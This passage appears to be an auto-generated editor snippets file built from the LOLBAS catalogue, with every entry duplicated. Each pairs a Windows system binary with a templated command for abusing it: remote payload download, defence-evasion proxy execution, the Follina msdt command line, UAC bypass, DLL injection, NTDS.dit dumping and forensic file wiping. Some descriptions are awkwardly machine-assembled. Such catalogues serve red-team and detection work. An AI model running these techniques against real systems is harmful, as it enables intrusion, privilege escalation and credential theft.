            "ConfigSecurityPolicy.exe is Binary part of Windows Defender. Used to manage settings in Windows Defender. You can configure different pilot collections for each of the co-management workloads. Being able to use different pilot collections allows you to take a more granular approach when shifting workloads.. it can It will download a remote payload and place it in INetCache., requires  privilege, category: Download, it can be used for Downloads payload from remote server.",
            "",
            "```sh",
            "ConfigSecurityPolicy.exe {REMOTEURL}${0}",
            "```"
        ],
        "description": "ConfigSecurityPolicy.exe is Binary part of Windows Defender. Used to manage settings in Windows Defender. You can configure different pilot collections for each of the co-management workloads. Being able to use different pilot collections allows you to take a more granular approach when shifting workloads.. it can It will download a remote payload and place it in INetCache., requires  privilege, category: Download, it can be used for Downloads payload from remote server."
    },
    "lolbas ConfigSecurityPolicy.exe Downloads payload from remote server": {
        "prefix": "lolbas ConfigSecurityPolicy.exe",
        "body": [
            "ConfigSecurityPolicy.exe is Binary part of Windows Defender. Used to manage settings in Windows Defender. You can configure different pilot collections for each of the co-management workloads. Being able to use different pilot collections allows you to take a more granular approach when shifting workloads.. it can It will download a remote payload and place it in INetCache., requires  privilege, category: Download, it can be used for Downloads payload from remote server.",
            "",
            "```sh",
            "ConfigSecurityPolicy.exe {REMOTEURL}${0}",
            "```"
        ],
        "description": "ConfigSecurityPolicy.exe is Binary part of Windows Defender. Used to manage settings in Windows Defender. You can configure different pilot collections for each of the co-management workloads. Being able to use different pilot collections allows you to take a more granular approach when shifting workloads.. it can It will download a remote payload and place it in INetCache., requires  privilege, category: Download, it can be used for Downloads payload from remote server."
    },
    "Stordiag.exe Possible defence evasion purposes. (lolbas)": {
        "prefix": "Stordiag.exe",
        "body": [
            "Stordiag.exe is Storage diagnostic tool. it can Once executed, Stordiag.exe will execute schtasks.exe and powershell.exe - if stordiag.exe is copied to a folder and an arbitrary executable is renamed to one of these names, stordiag.exe will execute it., requires  privilege, category: Execute, it can be used for Possible defence evasion purposes..",
            "",
            "```sh",
            "stordiag.exe${0}",
            "```"
        ],
        "description": "Stordiag.exe is Storage diagnostic tool. it can Once executed, Stordiag.exe will execute schtasks.exe and powershell.exe - if stordiag.exe is copied to a folder and an arbitrary executable is renamed to one of these names, stordiag.exe will execute it., requires  privilege, category: Execute, it can be used for Possible defence evasion purposes.."
    },
    "lolbas Stordiag.exe Possible defence evasion purposes.": {
        "prefix": "lolbas Stordiag.exe",
        "body": [
            "Stordiag.exe is Storage diagnostic tool. it can Once executed, Stordiag.exe will execute schtasks.exe and powershell.exe - if stordiag.exe is copied to a folder and an arbitrary executable is renamed to one of these names, stordiag.exe will execute it., requires  privilege, category: Execute, it can be used for Possible defence evasion purposes..",
            "",
            "```sh",
            "stordiag.exe${0}",
            "```"
        ],
        "description": "Stordiag.exe is Storage diagnostic tool. it can Once executed, Stordiag.exe will execute schtasks.exe and powershell.exe - if stordiag.exe is copied to a folder and an arbitrary executable is renamed to one of these names, stordiag.exe will execute it., requires  privilege, category: Execute, it can be used for Possible defence evasion purposes.."
    },
    "Scriptrunner.exe Execute binary through proxy binary to evade defensive counter measures (lolbas)": {
        "prefix": "Scriptrunner.exe",
        "body": [
            "Scriptrunner.exe is Execute binary through proxy binary to evade defensive counter measures. it can Executes executable, requires  privilege, category: Execute, it can be used for Execute binary through proxy binary to evade defensive counter measures.",
            "",
            "```sh",
            "Scriptrunner.exe -appvscript {PATH:.exe}${0}",
            "```"
        ],
        "description": "Scriptrunner.exe is Execute binary through proxy binary to evade defensive counter measures. it can Executes executable, requires  privilege, category: Execute, it can be used for Execute binary through proxy binary to evade defensive counter measures."
    },
    "lolbas Scriptrunner.exe Execute binary through proxy binary to evade defensive counter measures": {
        "prefix": "lolbas Scriptrunner.exe",
        "body": [
            "Scriptrunner.exe is Execute binary through proxy binary to evade defensive counter measures. it can Executes executable, requires  privilege, category: Execute, it can be used for Execute binary through proxy binary to evade defensive counter measures.",
            "",
            "```sh",
            "Scriptrunner.exe -appvscript {PATH:.exe}${0}",
            "```"
        ],
        "description": "Scriptrunner.exe is Execute binary through proxy binary to evade defensive counter measures. it can Executes executable, requires  privilege, category: Execute, it can be used for Execute binary through proxy binary to evade defensive counter measures."
    },
    "Scriptrunner.exe Execute binary through proxy binary from external server to evade defensive counter measures (lolbas)": {
        "prefix": "Scriptrunner.exe",
        "body": [
            "Scriptrunner.exe is Execute binary through proxy binary to evade defensive counter measures. it can Executes cmd file from remote server, requires  privilege, category: Execute, it can be used for Execute binary through proxy binary from external server to evade defensive counter measures.",
            "",
            "```sh",
            "ScriptRunner.exe -appvscript {PATH_SMB:.cmd}${0}",
            "```"
        ],
        "description": "Scriptrunner.exe is Execute binary through proxy binary to evade defensive counter measures. it can Executes cmd file from remote server, requires  privilege, category: Execute, it can be used for Execute binary through proxy binary from external server to evade defensive counter measures."
    },
    "lolbas Scriptrunner.exe Execute binary through proxy binary from external server to evade defensive counter measures": {
        "prefix": "lolbas Scriptrunner.exe",
        "body": [
            "Scriptrunner.exe is Execute binary through proxy binary to evade defensive counter measures. it can Executes cmd file from remote server, requires  privilege, category: Execute, it can be used for Execute binary through proxy binary from external server to evade defensive counter measures.",
            "",
            "```sh",
            "ScriptRunner.exe -appvscript {PATH_SMB:.cmd}${0}",
            "```"
        ],
        "description": "Scriptrunner.exe is Execute binary through proxy binary to evade defensive counter measures. it can Executes cmd file from remote server, requires  privilege, category: Execute, it can be used for Execute binary through proxy binary from external server to evade defensive counter measures."
    },
    "Cipher.exe Can be used to forensically erase a file (lolbas)": {
        "prefix": "Cipher.exe",
        "body": [
            "Cipher.exe is File Encryption Utility. it can Zero out a file, requires  privilege, category: Tamper, it can be used for Can be used to forensically erase a file.",
            "",
            "```sh",
            "cipher /w:{PATH_ABSOLUTE:folder}${0}",
            "```"
        ],
        "description": "Cipher.exe is File Encryption Utility. it can Zero out a file, requires  privilege, category: Tamper, it can be used for Can be used to forensically erase a file."
    },
    "lolbas Cipher.exe Can be used to forensically erase a file": {
        "prefix": "lolbas Cipher.exe",
        "body": [
            "Cipher.exe is File Encryption Utility. it can Zero out a file, requires  privilege, category: Tamper, it can be used for Can be used to forensically erase a file.",
            "",
            "```sh",
            "cipher /w:{PATH_ABSOLUTE:folder}${0}",
            "```"
        ],
        "description": "Cipher.exe is File Encryption Utility. it can Zero out a file, requires  privilege, category: Tamper, it can be used for Can be used to forensically erase a file."
    },
    "Odbcconf.exe Execute a DLL file using technique that can evade defensive counter measures (lolbas)": {
        "prefix": "Odbcconf.exe",
        "body": [
            "Odbcconf.exe is Used in Windows for managing ODBC connections. it can Execute DllRegisterServer from DLL specified., requires  privilege, category: Execute, it can be used for Execute a DLL file using technique that can evade defensive counter measures.",
            "",
            "```sh",
            "odbcconf /a {REGSVR {PATH_ABSOLUTE:.dll}}${0}",
            "```"
        ],
        "description": "Odbcconf.exe is Used in Windows for managing ODBC connections. it can Execute DllRegisterServer from DLL specified., requires  privilege, category: Execute, it can be used for Execute a DLL file using technique that can evade defensive counter measures."
    },
    "lolbas Odbcconf.exe Execute a DLL file using technique that can evade defensive counter measures": {
        "prefix": "lolbas Odbcconf.exe",
        "body": [
            "Odbcconf.exe is Used in Windows for managing ODBC connections. it can Execute DllRegisterServer from DLL specified., requires  privilege, category: Execute, it can be used for Execute a DLL file using technique that can evade defensive counter measures.",
            "",
            "```sh",
            "odbcconf /a {REGSVR {PATH_ABSOLUTE:.dll}}${0}",
            "```"
        ],
        "description": "Odbcconf.exe is Used in Windows for managing ODBC connections. it can Execute DllRegisterServer from DLL specified., requires  privilege, category: Execute, it can be used for Execute a DLL file using technique that can evade defensive counter measures."
    },
    "Odbcconf.exe Execute dll file using technique that can evade defensive counter measures (lolbas)": {
        "prefix": "Odbcconf.exe",
        "body": [
            "Odbcconf.exe is Used in Windows for managing ODBC connections. it can Load DLL specified in target .RSP file. See the Code Sample section for an example .RSP file., requires  privilege, category: Execute, it can be used for Execute dll file using technique that can evade defensive counter measures.",
            "",
            "```sh",
            "odbcconf -f {PATH:.rsp}${0}",
            "```"
        ],
        "description": "Odbcconf.exe is Used in Windows for managing ODBC connections. it can Load DLL specified in target .RSP file. See the Code Sample section for an example .RSP file., requires  privilege, category: Execute, it can be used for Execute dll file using technique that can evade defensive counter measures."
    },
    "lolbas Odbcconf.exe Execute dll file using technique that can evade defensive counter measures": {
        "prefix": "lolbas Odbcconf.exe",
        "body": [
            "Odbcconf.exe is Used in Windows for managing ODBC connections. it can Load DLL specified in target .RSP file. See the Code Sample section for an example .RSP file., requires  privilege, category: Execute, it can be used for Execute dll file using technique that can evade defensive counter measures.",
            "",
            "```sh",
            "odbcconf -f {PATH:.rsp}${0}",
            "```"
        ],
        "description": "Odbcconf.exe is Used in Windows for managing ODBC connections. it can Load DLL specified in target .RSP file. See the Code Sample section for an example .RSP file., requires  privilege, category: Execute, it can be used for Execute dll file using technique that can evade defensive counter measures."
    },
    "Extexport.exe Execute dll file (lolbas)": {
        "prefix": "Extexport.exe",
        "body": [
            "Extexport.exe is Load a DLL located in the c:\\test folder with a specific name.. it can Load a DLL located in the specified folder with one of the following names mozcrt19.dll, mozsqlite3.dll, or sqlite.dll., requires  privilege, category: Execute, it can be used for Execute dll file.",
            "",
            "```sh",
            "Extexport.exe {PATH_ABSOLUTE:folder} foo bar${0}",
            "```"
        ],
        "description": "Extexport.exe is Load a DLL located in the c:\\test folder with a specific name.. it can Load a DLL located in the specified folder with one of the following names mozcrt19.dll, mozsqlite3.dll, or sqlite.dll., requires  privilege, category: Execute, it can be used for Execute dll file."
    },
    "lolbas Extexport.exe Execute dll file": {
        "prefix": "lolbas Extexport.exe",
        "body": [
            "Extexport.exe is Load a DLL located in the c:\\test folder with a specific name.. it can Load a DLL located in the specified folder with one of the following names mozcrt19.dll, mozsqlite3.dll, or sqlite.dll., requires  privilege, category: Execute, it can be used for Execute dll file.",
            "",
            "```sh",
            "Extexport.exe {PATH_ABSOLUTE:folder} foo bar${0}",
            "```"
        ],
        "description": "Extexport.exe is Load a DLL located in the c:\\test folder with a specific name.. it can Load a DLL located in the specified folder with one of the following names mozcrt19.dll, mozsqlite3.dll, or sqlite.dll., requires  privilege, category: Execute, it can be used for Execute dll file."
    },
    "Msdt.exe Execute code (lolbas)": {
        "prefix": "Msdt.exe",
        "body": [
            "Msdt.exe is Microsoft diagnostics tool. it can Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the .xml file., requires  privilege, category: Execute, it can be used for Execute code.",
            "",
            "```sh",
            "msdt.exe -path C:\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE${0}",
            "```"
        ],
        "description": "Msdt.exe is Microsoft diagnostics tool. it can Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the .xml file., requires  privilege, category: Execute, it can be used for Execute code."
    },
    "lolbas Msdt.exe Execute code": {
        "prefix": "lolbas Msdt.exe",
        "body": [
            "Msdt.exe is Microsoft diagnostics tool. it can Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the .xml file., requires  privilege, category: Execute, it can be used for Execute code.",
            "",
            "```sh",
            "msdt.exe -path C:\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE${0}",
            "```"
        ],
        "description": "Msdt.exe is Microsoft diagnostics tool. it can Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the .xml file., requires  privilege, category: Execute, it can be used for Execute code."
    },
    "Msdt.exe Execute code bypass Application whitelisting (lolbas)": {
        "prefix": "Msdt.exe",
        "body": [
            "Msdt.exe is Microsoft diagnostics tool. it can Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the .xml file., requires  privilege, category: AWL Bypass, it can be used for Execute code bypass Application whitelisting.",
            "",
            "```sh",
            "msdt.exe -path C:\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE${0}",
            "```"
        ],
        "description": "Msdt.exe is Microsoft diagnostics tool. it can Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the .xml file., requires  privilege, category: AWL Bypass, it can be used for Execute code bypass Application whitelisting."
    },
    "lolbas Msdt.exe Execute code bypass Application whitelisting": {
        "prefix": "lolbas Msdt.exe",
        "body": [
            "Msdt.exe is Microsoft diagnostics tool. it can Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the .xml file., requires  privilege, category: AWL Bypass, it can be used for Execute code bypass Application whitelisting.",
            "",
            "```sh",
            "msdt.exe -path C:\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE${0}",
            "```"
        ],
        "description": "Msdt.exe is Microsoft diagnostics tool. it can Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the .xml file., requires  privilege, category: AWL Bypass, it can be used for Execute code bypass Application whitelisting."
    },
    "Msdt.exe Execute code bypass Application allowlisting (lolbas)": {
        "prefix": "Msdt.exe",
        "body": [
            "Msdt.exe is Microsoft diagnostics tool. it can Executes arbitrary commands using the Microsoft Diagnostics Tool and leveraging the \"PCWDiagnostic\" module (CVE-2022-30190). Note that this specific technique will not work on a patched system with the June 2022 Windows Security update., requires  privilege, category: AWL Bypass, it can be used for Execute code bypass Application allowlisting.",
            "",
            "```sh",
            "msdt.exe /id PCWDiagnostic /skip force /param \"IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe\"${0}",
            "```"
        ],
        "description": "Msdt.exe is Microsoft diagnostics tool. it can Executes arbitrary commands using the Microsoft Diagnostics Tool and leveraging the \"PCWDiagnostic\" module (CVE-2022-30190). Note that this specific technique will not work on a patched system with the June 2022 Windows Security update., requires  privilege, category: AWL Bypass, it can be used for Execute code bypass Application allowlisting."
    },
    "lolbas Msdt.exe Execute code bypass Application allowlisting": {
        "prefix": "lolbas Msdt.exe",
        "body": [
            "Msdt.exe is Microsoft diagnostics tool. it can Executes arbitrary commands using the Microsoft Diagnostics Tool and leveraging the \"PCWDiagnostic\" module (CVE-2022-30190). Note that this specific technique will not work on a patched system with the June 2022 Windows Security update., requires  privilege, category: AWL Bypass, it can be used for Execute code bypass Application allowlisting.",
            "",
            "```sh",
            "msdt.exe /id PCWDiagnostic /skip force /param \"IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe\"${0}",
            "```"
        ],
        "description": "Msdt.exe is Microsoft diagnostics tool. it can Executes arbitrary commands using the Microsoft Diagnostics Tool and leveraging the \"PCWDiagnostic\" module (CVE-2022-30190). Note that this specific technique will not work on a patched system with the June 2022 Windows Security update., requires  privilege, category: AWL Bypass, it can be used for Execute code bypass Application allowlisting."
    },
    "Colorcpl.exe Copies file(s) to a subfolder of a generally trusted folder (c:\\Windows\\System32), which can be used to hide files or make them blend into the environment. (lolbas)": {
        "prefix": "Colorcpl.exe",
        "body": [
            "Colorcpl.exe is Binary that handles color management. it can Copies the referenced file to C:\\Windows\\System32\\spool\\drivers\\color\\., requires  privilege, category: Copy, it can be used for Copies file(s) to a subfolder of a generally trusted folder (c:\\Windows\\System32), which can be used to hide files or make them blend into the environment..",
            "",
            "```sh",
            "colorcpl {PATH}${0}",
            "```"
        ],
        "description": "Colorcpl.exe is Binary that handles color management. it can Copies the referenced file to C:\\Windows\\System32\\spool\\drivers\\color\\., requires  privilege, category: Copy, it can be used for Copies file(s) to a subfolder of a generally trusted folder (c:\\Windows\\System32), which can be used to hide files or make them blend into the environment.."
    },
    "lolbas Colorcpl.exe Copies file(s) to a subfolder of a generally trusted folder (c:\\Windows\\System32), which can be used to hide files or make them blend into the environment.": {
        "prefix": "lolbas Colorcpl.exe",
        "body": [
            "Colorcpl.exe is Binary that handles color management. it can Copies the referenced file to C:\\Windows\\System32\\spool\\drivers\\color\\., requires  privilege, category: Copy, it can be used for Copies file(s) to a subfolder of a generally trusted folder (c:\\Windows\\System32), which can be used to hide files or make them blend into the environment..",
            "",
            "```sh",
            "colorcpl {PATH}${0}",
            "```"
        ],
        "description": "Colorcpl.exe is Binary that handles color management. it can Copies the referenced file to C:\\Windows\\System32\\spool\\drivers\\color\\., requires  privilege, category: Copy, it can be used for Copies file(s) to a subfolder of a generally trusted folder (c:\\Windows\\System32), which can be used to hide files or make them blend into the environment.."
    },
    "WorkFolders.exe Can be used to evade defensive countermeasures or to hide as a persistence mechanism (lolbas)": {
        "prefix": "WorkFolders.exe",
        "body": [
            "WorkFolders.exe is Work Folders. it can Execute control.exe in the current working directory, requires  privilege, category: Execute, it can be used for Can be used to evade defensive countermeasures or to hide as a persistence mechanism.",
            "",
            "```sh",
            "WorkFolders${0}",
            "```"
        ],
        "description": "WorkFolders.exe is Work Folders. it can Execute control.exe in the current working directory, requires  privilege, category: Execute, it can be used for Can be used to evade defensive countermeasures or to hide as a persistence mechanism."
    },
    "lolbas WorkFolders.exe Can be used to evade defensive countermeasures or to hide as a persistence mechanism": {
        "prefix": "lolbas WorkFolders.exe",
        "body": [
            "WorkFolders.exe is Work Folders. it can Execute control.exe in the current working directory, requires  privilege, category: Execute, it can be used for Can be used to evade defensive countermeasures or to hide as a persistence mechanism.",
            "",
            "```sh",
            "WorkFolders${0}",
            "```"
        ],
        "description": "WorkFolders.exe is Work Folders. it can Execute control.exe in the current working directory, requires  privilege, category: Execute, it can be used for Can be used to evade defensive countermeasures or to hide as a persistence mechanism."
    },
    "Diskshadow.exe Use diskshadow to exfiltrate data from VSS such as NTDS.dit (lolbas)": {
        "prefix": "Diskshadow.exe",
        "body": [
            "Diskshadow.exe is Diskshadow.exe is a tool that exposes the functionality offered by the volume shadow copy Service (VSS).. it can Execute commands using diskshadow.exe from a prepared diskshadow script., requires  privilege, category: Dump, it can be used for Use diskshadow to exfiltrate data from VSS such as NTDS.dit.",
            "",
            "```sh",
            "diskshadow.exe /s {PATH:.txt}${0}",
            "```"
        ],
        "description": "Diskshadow.exe is Diskshadow.exe is a tool that exposes the functionality offered by the volume shadow copy Service (VSS).. it can Execute commands using diskshadow.exe from a prepared diskshadow script., requires  privilege, category: Dump, it can be used for Use diskshadow to exfiltrate data from VSS such as NTDS.dit."
    },
    "lolbas Diskshadow.exe Use diskshadow to exfiltrate data from VSS such as NTDS.dit": {
        "prefix": "lolbas Diskshadow.exe",
        "body": [
            "Diskshadow.exe is Diskshadow.exe is a tool that exposes the functionality offered by the volume shadow copy Service (VSS).. it can Execute commands using diskshadow.exe from a prepared diskshadow script., requires  privilege, category: Dump, it can be used for Use diskshadow to exfiltrate data from VSS such as NTDS.dit.",
            "",
            "```sh",
            "diskshadow.exe /s {PATH:.txt}${0}",
            "```"
        ],
        "description": "Diskshadow.exe is Diskshadow.exe is a tool that exposes the functionality offered by the volume shadow copy Service (VSS).. it can Execute commands using diskshadow.exe from a prepared diskshadow script., requires  privilege, category: Dump, it can be used for Use diskshadow to exfiltrate data from VSS such as NTDS.dit."
    },
    "Diskshadow.exe Use diskshadow to bypass defensive counter measures (lolbas)": {
        "prefix": "Diskshadow.exe",
        "body": [
            "Diskshadow.exe is Diskshadow.exe is a tool that exposes the functionality offered by the volume shadow copy Service (VSS).. it can Execute commands using diskshadow.exe to spawn child process, requires  privilege, category: Execute, it can be used for Use diskshadow to bypass defensive counter measures.",
            "",
            "```sh",
            "diskshadow> exec {PATH:.exe}${0}",
            "```"
        ],
        "description": "Diskshadow.exe is Diskshadow.exe is a tool that exposes the functionality offered by the volume shadow copy Service (VSS).. it can Execute commands using diskshadow.exe to spawn child process, requires  privilege, category: Execute, it can be used for Use diskshadow to bypass defensive counter measures."
    },
    "lolbas Diskshadow.exe Use diskshadow to bypass defensive counter measures": {
        "prefix": "lolbas Diskshadow.exe",
        "body": [
            "Diskshadow.exe is Diskshadow.exe is a tool that exposes the functionality offered by the volume shadow copy Service (VSS).. it can Execute commands using diskshadow.exe to spawn child process, requires  privilege, category: Execute, it can be used for Use diskshadow to bypass defensive counter measures.",
            "",
            "```sh",
            "diskshadow> exec {PATH:.exe}${0}",
            "```"
        ],
        "description": "Diskshadow.exe is Diskshadow.exe is a tool that exposes the functionality offered by the volume shadow copy Service (VSS).. it can Execute commands using diskshadow.exe to spawn child process, requires  privilege, category: Execute, it can be used for Use diskshadow to bypass defensive counter measures."
    },
    "Extrac32.exe Extract data from cab file and hide it in an alternate data stream. (lolbas)": {
        "prefix": "Extrac32.exe",
        "body": [
            "Extrac32.exe is Extract to ADS, copy or overwrite a file with Extrac32.exe. it can Extracts the source CAB file on an unc path into an Alternate Data Stream (ADS) of the target file., requires  privilege, category: ADS, it can be used for Extract data from cab file and hide it in an alternate data stream..",
            "",
            "```sh",
            "extrac32 {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE}:file.exe${0}",
            "```"
        ],
        "description": "Extrac32.exe is Extract to ADS, copy or overwrite a file with Extrac32.exe. it can Extracts the source CAB file on an unc path into an Alternate Data Stream (ADS) of the target file., requires  privilege, category: ADS, it can be used for Extract data from cab file and hide it in an alternate data stream.."
    },
    "lolbas Extrac32.exe Extract data from cab file and hide it in an alternate data stream.": {
        "prefix": "lolbas Extrac32.exe",
        "body": [
            "Extrac32.exe is Extract to ADS, copy or overwrite a file with Extrac32.exe. it can Extracts the source CAB file on an unc path into an Alternate Data Stream (ADS) of the target file., requires  privilege, category: ADS, it can be used for Extract data from cab file and hide it in an alternate data stream..",
            "",
            "```sh",
            "extrac32 {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE}:file.exe${0}",
            "```"
        ],
        "description": "Extrac32.exe is Extract to ADS, copy or overwrite a file with Extrac32.exe. it can Extracts the source CAB file on an unc path into an Alternate Data Stream (ADS) of the target file., requires  privilege, category: ADS, it can be used for Extract data from cab file and hide it in an alternate data stream.."
    },
    "Extrac32.exe Download file from UNC/WEBDav (lolbas)": {
        "prefix": "Extrac32.exe",
        "body": [
            "Extrac32.exe is Extract to ADS, copy or overwrite a file with Extrac32.exe. it can Copy the source file to the destination file and overwrite it., requires  privilege, category: Download, it can be used for Download file from UNC/WEBDav.",
            "",
            "```sh",
            "extrac32 /Y /C {PATH_SMB} {PATH_ABSOLUTE}${0}",
            "```"
        ],
        "description": "Extrac32.exe is Extract to ADS, copy or overwrite a file with Extrac32.exe. it can Copy the source file to the destination file and overwrite it., requires  privilege, category: Download, it can be used for Download file from UNC/WEBDav."
    },
    "lolbas Extrac32.exe Download file from UNC/WEBDav": {
        "prefix": "lolbas Extrac32.exe",
        "body": [
            "Extrac32.exe is Extract to ADS, copy or overwrite a file with Extrac32.exe. it can Copy the source file to the destination file and overwrite it., requires  privilege, category: Download, it can be used for Download file from UNC/WEBDav.",
            "",
            "```sh",
            "extrac32 /Y /C {PATH_SMB} {PATH_ABSOLUTE}${0}",
            "```"
        ],
        "description": "Extrac32.exe is Extract to ADS, copy or overwrite a file with Extrac32.exe. it can Copy the source file to the destination file and overwrite it., requires  privilege, category: Download, it can be used for Download file from UNC/WEBDav."
    },
    "Extrac32.exe Copy file (lolbas)": {
        "prefix": "Extrac32.exe",
        "body": [
            "Extrac32.exe is Extract to ADS, copy or overwrite a file with Extrac32.exe. it can Command for copying file from one folder to another, requires  privilege, category: Copy, it can be used for Copy file.",
            "",
            "```sh",
            "extrac32.exe /C {PATH_ABSOLUTE:.source.exe} {PATH_ABSOLUTE:.dest.exe}${0}",
            "```"
        ],
        "description": "Extrac32.exe is Extract to ADS, copy or overwrite a file with Extrac32.exe. it can Command for copying file from one folder to another, requires  privilege, category: Copy, it can be used for Copy file."
    },
    "lolbas Extrac32.exe Copy file": {
        "prefix": "lolbas Extrac32.exe",
        "body": [
            "Extrac32.exe is Extract to ADS, copy or overwrite a file with Extrac32.exe. it can Command for copying file from one folder to another, requires  privilege, category: Copy, it can be used for Copy file.",
            "",
            "```sh",
            "extrac32.exe /C {PATH_ABSOLUTE:.source.exe} {PATH_ABSOLUTE:.dest.exe}${0}",
            "```"
        ],
        "description": "Extrac32.exe is Extract to ADS, copy or overwrite a file with Extrac32.exe. it can Command for copying file from one folder to another, requires  privilege, category: Copy, it can be used for Copy file."
    },
    "Eventvwr.exe Execute a binary or script as a high-integrity process without a UAC prompt. (lolbas)": {
        "prefix": "Eventvwr.exe",
        "body": [
            "Eventvwr.exe is Displays Windows Event Logs in a GUI window.. it can During startup, eventvwr.exe checks the registry value HKCU\\Software\\Classes\\mscfile\\shell\\open\\command for the location of mmc.exe, which is used to open the eventvwr.msc saved console file. If the location of another binary or script is added to this registry value, it will be executed as a high-integrity process without a UAC prompt being displayed to the user., requires  privilege, category: UAC Bypass, it can be used for Execute a binary or script as a high-integrity process without a UAC prompt..",
            "",
            "```sh",
            "eventvwr.exe${0}",
            "```"
        ],
        "description": "Eventvwr.exe is Displays Windows Event Logs in a GUI window.. it can During startup, eventvwr.exe checks the registry value HKCU\\Software\\Classes\\mscfile\\shell\\open\\command for the location of mmc.exe, which is used to open the eventvwr.msc saved console file. If the location of another binary or script is added to this registry value, it will be executed as a high-integrity process without a UAC prompt being displayed to the user., requires  privilege, category: UAC Bypass, it can be used for Execute a binary or script as a high-integrity process without a UAC prompt.."
    },
    "lolbas Eventvwr.exe Execute a binary or script as a high-integrity process without a UAC prompt.": {
        "prefix": "lolbas Eventvwr.exe",
        "body": [
            "Eventvwr.exe is Displays Windows Event Logs in a GUI window.. it can During startup, eventvwr.exe checks the registry value HKCU\\Software\\Classes\\mscfile\\shell\\open\\command for the location of mmc.exe, which is used to open the eventvwr.msc saved console file. If the location of another binary or script is added to this registry value, it will be executed as a high-integrity process without a UAC prompt being displayed to the user., requires  privilege, category: UAC Bypass, it can be used for Execute a binary or script as a high-integrity process without a UAC prompt..",
            "",
            "```sh",
            "eventvwr.exe${0}",
            "```"
        ],
        "description": "Eventvwr.exe is Displays Windows Event Logs in a GUI window.. it can During startup, eventvwr.exe checks the registry value HKCU\\Software\\Classes\\mscfile\\shell\\open\\command for the location of mmc.exe, which is used to open the eventvwr.msc saved console file. If the location of another binary or script is added to this registry value, it will be executed as a high-integrity process without a UAC prompt being displayed to the user., requires  privilege, category: UAC Bypass, it can be used for Execute a binary or script as a high-integrity process without a UAC prompt.."
    },
    "Eventvwr.exe Execute a command to bypass security restrictions that limit the use of command-line interpreters. (lolbas)": {
        "prefix": "Eventvwr.exe",
        "body": [
            "Eventvwr.exe is Displays Windows Event Logs in a GUI window.. it can During startup, eventvwr.exe uses .NET deserialization with %LOCALAPPDATA%\\Microsoft\\EventV~1\\RecentViews file. This file can be created using https://github.com/pwntester/ysoserial.net, requires  privilege, category: UAC Bypass, it can be used for Execute a command to bypass security restrictions that limit the use of command-line interpreters..",
            "",
            "```sh",
            "ysoserial.exe -o raw -f BinaryFormatter - g DataSet -c \"{CMD}\" > RecentViews & copy RecentViews %LOCALAPPDATA%\\Microsoft\\EventV~1\\RecentViews & eventvwr.exe${0}",
            "```"
        ],
        "description": "Eventvwr.exe is Displays Windows Event Logs in a GUI window.. it can During startup, eventvwr.exe uses .NET deserialization with %LOCALAPPDATA%\\Microsoft\\EventV~1\\RecentViews file. This file can be created using https://github.com/pwntester/ysoserial.net, requires  privilege, category: UAC Bypass, it can be used for Execute a command to bypass security restrictions that limit the use of command-line interpreters.."
    },
    "lolbas Eventvwr.exe Execute a command to bypass security restrictions that limit the use of command-line interpreters.": {
        "prefix": "lolbas Eventvwr.exe",
        "body": [
            "Eventvwr.exe is Displays Windows Event Logs in a GUI window.. it can During startup, eventvwr.exe uses .NET deserialization with %LOCALAPPDATA%\\Microsoft\\EventV~1\\RecentViews file. This file can be created using https://github.com/pwntester/ysoserial.net, requires  privilege, category: UAC Bypass, it can be used for Execute a command to bypass security restrictions that limit the use of command-line interpreters..",
            "",
            "```sh",
            "ysoserial.exe -o raw -f BinaryFormatter - g DataSet -c \"{CMD}\" > RecentViews & copy RecentViews %LOCALAPPDATA%\\Microsoft\\EventV~1\\RecentViews & eventvwr.exe${0}",
            "```"
        ],
        "description": "Eventvwr.exe is Displays Windows Event Logs in a GUI window.. it can During startup, eventvwr.exe uses .NET deserialization with %LOCALAPPDATA%\\Microsoft\\EventV~1\\RecentViews file. This file can be created using https://github.com/pwntester/ysoserial.net, requires  privilege, category: UAC Bypass, it can be used for Execute a command to bypass security restrictions that limit the use of command-line interpreters.."
    },
    "Mavinject.exe Inject dll file into running process (lolbas)": {
        "prefix": "Mavinject.exe",
        "body": [
            "Mavinject.exe is Used by App-v in Windows. it can Inject file.dll stored as an Alternate Data Stream (ADS) into a process with PID 4172, requires  privilege, category: ADS, it can be used for Inject dll file into running process.",
            "",
            "```sh",
            "Mavinject.exe 4172 /INJECTRUNNING {PATH_ABSOLUTE}:file.dll${0}",
            "```"
        ],
        "description": "Mavinject.exe is Used by App-v in Windows. it can Inject file.dll stored as an Alternate Data Stream (ADS) into a process with PID 4172, requires  privilege, category: ADS, it can be used for Inject dll file into running process."
    },
    "lolbas Mavinject.exe Inject dll file into running process": {
        "prefix": "lolbas Mavinject.exe",
        "body": [
            "Mavinject.exe is Used by App-v in Windows. it can Inject file.dll stored as an Alternate Data Stream (ADS) into a process with PID 4172, requires  privilege, category: ADS, it can be used for Inject dll file into running process.",
            "",
            "```sh",
            "Mavinject.exe 4172 /INJECTRUNNING {PATH_ABSOLUTE}:file.dll${0}",
            "```"
        ],
        "description": "Mavinject.exe is Used by App-v in Windows. it can Inject file.dll stored as an Alternate Data Stream (ADS) into a process with PID 4172, requires  privilege, category: ADS, it can be used for Inject dll file into running process."
    },
    "Regasm.exe Execute code and bypass Application whitelisting (lolbas)": {
        "prefix": "Regasm.exe",
        "body": [
            "Regasm.exe is Part of .NET. it can Loads the target .DLL file and executes the UnRegisterClass function., requires  privilege, category: Execute, it can be used for Execute code and bypass Application whitelisting.",
            "",
            "```sh",
            "regasm.exe /U {PATH:.dll}${0}",
            "```"
